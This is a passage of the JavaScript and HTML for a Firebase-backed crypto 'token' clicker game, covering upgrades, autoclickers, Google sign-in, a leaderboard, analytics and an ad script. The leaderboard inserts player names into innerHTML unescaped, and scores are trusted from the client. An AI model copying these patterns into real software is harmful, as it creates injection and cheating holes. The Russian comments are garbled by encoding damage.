        startAutoclicker(remainingTime);
        document.getElementById("autoclickBtn").disabled = true;
      } else if (autoclickActive) {
        // –ê–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –∏—Å—Ç–µ–∫
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0
        });
        stopAutoclicker();
      }

      // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
    }

    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–µ–∫—É—â–µ–µ –≤—Ä–µ–º—è –∫–∞–∫ lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}

  
/*!!! function submitScore() {
  if (!user) return;
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: user.displayName || "Anonymous",
    score: score,
    clickPower: clickPower,
    autoclickEndTime: autoclickEndTime,
    autoclick: autoclickActive // —Å–æ—Ö—Ä–∞–Ω—è–µ–º autoclick !!!!!
  });
} !!!*/

function submitScore() {
  if (!user) return;
  // –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –ø—É—Å—Ç–æ–µ
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`; // –ò—Å–ø–æ–ª—å–∑—É–µ–º —á–∞—Å—Ç—å UID, –µ—Å–ª–∏ –∏–º–µ–Ω–∏ –Ω–µ—Ç
  
  db.ref("leaderboard/" + user.uid).set({
    id: user.uid,
    name: userName, // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∏–º—è
    name: user.displayName || "Anonymous",
    score: score,
    clickPower: clickPower,
    autoclickActive: autoclickActive,
    autoclickEndTime: autoclickEndTime,
    lastUpdate: Date.now()
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—á–µ—Ç–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø—Ä–æ–≥—Ä–µ—Å—Å.");
  });
}
  
  

function buyUpgrade(type) {
  const cost = getClickPowerUpgradeCost();
  if (type === "clickPower") {
    if (clickPower >= 8) {
      showMessage("Click Power is at maximum!");
      return;
    }
/* const cost = clickPowerUpgradeCosts[nextLevel - 1]; // —É—Ä–æ–≤–Ω–∏ –Ω–∞—á–∏–Ω–∞—é—Ç—Å—è —Å 1 */
  /*  const cost = getClickPowerUpgradeCost(); */
    if (score >= cost) {
      score -= cost;
      clickPower++;
    /*if (score >= 50) {
      score -= 50;
      clickPower++; */
  /*  if (score >= cost) {
      score -= cost;
      clickPower++; */
      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      updateClickPowerCostText();
      submitScore();
      showMessage("Click Power upgraded!");
    } else {
      showMessage("Not enough tokens for upgrade.");
    }
  } else if (type === "autoclick") {
    if (autoclickCooldown) {
      showMessage("Autoclicker on cooldown.");
      return;
    }
    if (score >= 200) {
      score -= 200;
      updateCounterDisplay();
      showMessage("Autoclicker activated for 1 minute!");
      autoclickCooldown = true;
      autoclickActive = true;
      autoclickEndTime = Date.now() + 60000;
      updateProfilePanel();
      document.getElementById("autoclickBtn").disabled = true;
      startAutoclicker(60000);
      submitScore();
    } else {
      showMessage("Not enough tokens for autoclicker.");
    }
  }
}


/*function buyAutoclicker(minutes) {
  if (autoclickCooldown) {
    showMessage("Autoclicker on cooldown.");
    return;
  }

  const prices = {
    1: 200,
    5: 800,
    10: 1400
  };

  const cost = prices[minutes];
  if (score >= cost) {
    score -= cost;
    updateCounterDisplay();
    showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
    autoclickCooldown = true;
    autoclickActive = true;
    autoclickEndTime = Date.now() + minutes * 60000;
    updateProfilePanel();
    startAutoclicker(minutes * 60000);
    submitScore();
  } else {
    showMessage("Not enough tokens for autoclicker.");
  }
} */


function buyAutoclicker(minutes) {
  if (autoclickCooldown) {
    showMessage("Autoclicker on cooldown.");
    return;
  }

  const prices = {
    1: 200,
    5: 400,
    10: 1400
  };

  const cost = prices[minutes];
  if (score >= cost) {
    score -= cost;
    updateCounterDisplay();
    showMessage(`Autoclicker activated for ${minutes} minute(s)!`);
    autoclickCooldown = true;
    autoclickActive = true;
    const duration = minutes * 60000;
    autoclickEndTime = Date.now() + duration;

    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≤ –±–∞–∑–µ
    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        autoclickActive: true,
        autoclickEndTime: autoclickEndTime,
        score: score,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–∫—É–ø–∫–∏ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞:", error);
      });
    }

    updateProfilePanel();
    startAutoclicker(duration);
    submitScore();
  } else {
    showMessage("Not enough tokens for autoclicker.");
  }
}
  

  
function signInWithGoogle() {
  const provider = new firebase.auth.GoogleAuthProvider();
  auth.signInWithPopup(provider).then(result => {
    user = result.user;
    document.getElementById("authSection").style.display = "none";
    document.getElementById("gameSection").style.display = "block";
    loadPlayerData(user.uid);
    submitScore(); // –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
  }).catch(error => {
    showMessage("Google sign-in failed.");
    console.error(error);
  });
}

function signOut() {
  auth.signOut().then(() => {
    user = null;
    score = 0;
    clickPower = 1;
 //   autoclickActive = false;
    autoclickEndTime = 0;
    clearInterval(autoclickInterval);
    document.getElementById("authSection").style.display = "block";
    document.getElementById("gameSection").style.display = "none";
    updateCounterDisplay();
    updateClickPowerBar();
    updateProfilePanel();
  });
} 

 auth.onAuthStateChanged(currentUser => {
  if (currentUser) {
    user = currentUser;
    document.getElementById("authSection").style.display = "none";
    document.getElementById("gameSection").style.display = "block";
    loadPlayerData(user.uid);
    checkDailyReward(); // –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ–∂–µ–¥–Ω–µ–≤–Ω—É—é –Ω–∞–≥—Ä–∞–¥—É
  }
}); 

  
/* !db.ref("leaderboard").on("value", snapshot => {
  const data = [];
  snapshot.forEach(child => data.push(child.val()));
  data.sort((a, b) => b.score - a.score);
  const leaderboard = document.getElementById("leaderboard");
  leaderboard.innerHTML = "";
  data.slice(0, 10).forEach((entry, index) => {
    leaderboard.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
  });
}); !*/

db.ref("leaderboard").on("value", snapshot => {
  const data = [];
  snapshot.forEach(child => {
    const entry = child.val();
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –¥–∞–Ω–Ω—ã–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã
    if (entry && entry.score !== undefined && entry.name) {
      data.push({
        id: entry.id,
        name: entry.name,
        score: entry.score
      });
    }
  });

  // –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ —É–±—ã–≤–∞–Ω–∏—é –æ—á–∫–æ–≤
  data.sort((a, b) => b.score - a.score);

  const leaderboard = document.getElementById("leaderboard");
  leaderboard.innerHTML = "";

  if (data.length === 0) {
    leaderboard.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
    return;
  }

  data.slice(0, 10).forEach((entry, index) => {
    leaderboard.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
  });
}, error => {
  console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –ª–∏–¥–µ—Ä–±–æ—Ä–¥–∞:", error);
  showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ç–∞–±–ª–∏—Ü—É –ª–∏–¥–µ—Ä–æ–≤.");
});  

setInterval(() => {
  if (user) {
    updateProfilePanel();
    if (score > 0) submitScore();
  }
}, 1000);

  

// --- –ù–æ–≤—ã–π –∫–æ–¥ –¥–ª—è –º–æ—Ç–∏–≤–∞—Ü–∏–∏ ---
const motivationalPhrases = [
  "Click ‚Äî earn tokens.", "Sign in ‚Äî save your progress.", "Your crypto journey starts here.", "No account ‚Äî no profit!", "Log in and turn clicks into income!", "The first tokens are always the most valuable.", "Top farmers are waiting for you!", "Level up ‚Äî earn even more tokens!", "Crypto wealth starts with a single click.", "Skip signing in ‚Äî miss the rewards!"

];

let motiveIndex = 0;
const motiveElement = document.getElementById("motiveText");

setInterval(() => {
  motiveElement.style.opacity = 0;
  setTimeout(() => {
    motiveIndex = (motiveIndex + 1) % motivationalPhrases.length;
    motiveElement.innerText = motivationalPhrases[motiveIndex];
    motiveElement.style.opacity = 1;
  }, 500);
}, 3000);
</script>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-G76GTQQKG0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-G76GTQQKG0');
</script>

<div class="ad-container">
  <script type="text/javascript">
    atOptions = {
      'key': '37256add668a0f644adfae7b41a567a3',
      'format': 'iframe',
      'height': 90,
      'width': 728,
      'params': {}
    };
  </script>
  <script type="text/javascript" src="//www.highperformanceformat.com/37256add668a0f644adfae7b41a567a3/invoke.js"></script>
</div>
  
  
</body>
</html>
